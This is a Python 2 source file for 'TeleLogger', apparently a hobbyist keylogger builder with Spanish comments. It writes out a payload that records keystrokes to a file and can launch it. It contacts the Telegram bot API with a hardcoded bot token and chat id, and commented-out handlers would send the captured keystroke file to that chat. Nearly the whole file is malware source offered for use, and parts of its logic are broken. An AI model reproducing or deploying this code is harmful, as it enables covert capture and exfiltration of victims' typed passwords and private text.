# -*- coding: utf-8 -*-

import urllib
import urllib2
import os
import subprocess
import socket
#import telebot

print("  _______   _      _						")
print(" |__   __| | |    | |						")
print("    | | ___| | ___| |     ___   __ _  __ _  ___ _ __		")
print("    | |/ _ \ |/ _ \ |    / _ \ / _` |/ _` |/ _ \ '__|		")
print("    | |  __/ |  __/ |___| (_) | (_| | (_| |  __/ |		")
print("    |_|\___|_|\___|______\___/ \__, |\__, |\___|_|		")
print("                                __/ | __/ |			")
print("                               |___/ |___/	ver 0.1		")
print("									")
print("						Alex Franco		")
print("									")


commands = {
                'start': 'Inicia keylogger.',
                'stop': 'Para el keylogger y envia teclas.',
}

help = "Comandos disponibles: \n \n"
for key in commands:
	help += "/" + key + ": "
	help += commands[key] + "\n"


TOKEN = "372274699:AAH8t7ML7zdXoCSxiJOqPSSFmTILQ68zflY"
chat_id = "184832283"
#bot = telebot.TeleBot(TOKEN)
#TOKEN = raw_input('Introduce TOKEN: ') # 372274699:AAH8t7ML7zdXoCSxiJOqPSSFmTILQ68zflY
#chat_id = raw_input('Introduce Chat ID: ') # 184832283
hostname = str("[/] ") +  socket.gethostname() + str(" connected")

print("[*] Generando archivo.. ")

a = open('payload.py', 'a')
a.write('''
import keylogger
import urllib
import urllib2
import os
import subprocess
import socket
import time

now = time.time()

def done():
        now + 60

#done = lambda: time.time() > now + 60

def print_keys(t, modifiers, keys):
        a = open("teclas.txt", "a")
        a.write("%r" % keys)

def main():
        keylogger.log(done, print_keys)

main()
''')

hola = raw_input('¿Quieres dar mensaje de bienvenida? [Y/n]: ')
lhola = hola.lower()

if lhola != 'N':
	urllib2.urlopen("https://api.telegram.org/bot" + "372274699:AAH8t7ML7zdXoCSxiJOqPSSFmTILQ68zflY" + "/sendMessage", urllib.urlencode({ "chat_id": chat_id, "text": "hola" }))
	urllib2.urlopen("https://api.telegram.org/bot" + "372274699:AAH8t7ML7zdXoCSxiJOqPSSFmTILQ68zflY" + "/sendMessage", urllib.urlencode({ "chat_id": chat_id, "text": "help" }))
else:
	print("Sin mensaje")

execute = raw_input('¿Quieres ejecutar el payload generado? [y/N]: ')
lexecute = execute.lower()
pwd = subprocess.check_output("pwd | tr -d '\n'", shell=True)


if lexecute != 'y':
	print str('[*] Archivo guardado en: ') + pwd + str('/payload.py')
else:
#	os.system("python payload.py")
	subprocess.call(['xterm','-e','python','payload.py'])

#@bot.message_handler(commands=['start'])
#def register_keys(mensaje):
#    print(" [*] Starting keylogger...")
#    os.system("python payload.py")

#@bot.message_handler(commands=['stop'])
#def stop_register_keys(mensaje):
#    print(" [*] Sending keys...")
#    doc = open('teclas.txt', 'rb')
#    bot.send_document(chat_id, doc)



